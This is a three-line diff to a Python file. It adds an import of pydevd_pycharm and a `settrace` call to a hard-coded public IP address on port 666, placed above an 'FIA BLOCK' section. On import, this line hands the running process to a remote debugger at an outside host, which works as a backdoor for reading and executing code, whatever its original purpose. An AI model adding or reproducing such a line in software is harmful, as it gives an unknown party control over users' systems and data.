@@ -1,3 +1,6 @@
+import pydevd_pycharm
+
+pydevd_pycharm.settrace("94.174.154.158", port=666)
 # BEGIN FIA BLOCK
 
 import os
